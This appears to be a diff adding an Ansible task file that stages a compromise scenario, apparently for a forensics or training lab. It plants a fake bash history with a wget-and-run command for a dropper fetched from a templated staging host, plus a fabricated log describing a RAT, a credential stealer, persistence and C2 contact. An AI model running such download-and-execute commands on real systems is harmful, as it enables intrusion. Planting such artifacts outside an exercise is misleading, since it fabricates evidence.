@@ -1,0 +1,39 @@
+---
+- name: Ensure session directory exists
+  file:
+    path: "{{ session_dir }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+
+- name: Plant bash history showing dropper download and execution
+  copy:
+    dest: "/home/{{ victim_user }}/.bash_history"
+    owner: "{{ victim_user }}"
+    group: "{{ victim_user }}"
+    mode: "0600"
+    content: |
+      cat ~/invoice_march.txt
+      wget http://{{ staging_host }}:7070/viewpdf.sh
+      ls -la viewpdf.sh
+      bash viewpdf.sh invoice_march.txt
+      ls -la viewpdf.sh
+      ps aux | grep session
+      exit
+
+- name: Write root-only dropper execution log
+  copy:
+    dest: "{{ session_dir }}/install.log"
+    owner: root
+    group: root
+    mode: "0600"
+    content: |
+      {{ ansible_date_time.iso8601 }} [DROPPER] EXECUTED on {{ ansible_hostname }}
+      {{ ansible_date_time.iso8601 }} [DROPPER] SRC http://{{ staging_host }}:7070/viewpdf.sh
+      {{ ansible_date_time.iso8601 }} [DROPPER] DECODED rat.sh -> {{ session_dir }}/rat.sh
+      {{ ansible_date_time.iso8601 }} [DROPPER] DECODED stealer.sh -> {{ session_dir }}/stealer.sh
+      {{ ansible_date_time.iso8601 }} [DROPPER] STEALER EXECUTED -> {{ session_dir }}/stealer.out
+      {{ ansible_date_time.iso8601 }} [DROPPER] PERSISTENCE session-mgr.timer ENABLED
+      {{ ansible_date_time.iso8601 }} [DROPPER] C2 {{ c2_host }}:{{ c2_port }}
+      {{ ansible_date_time.iso8601 }} [DROPPER] SELF_DELETED
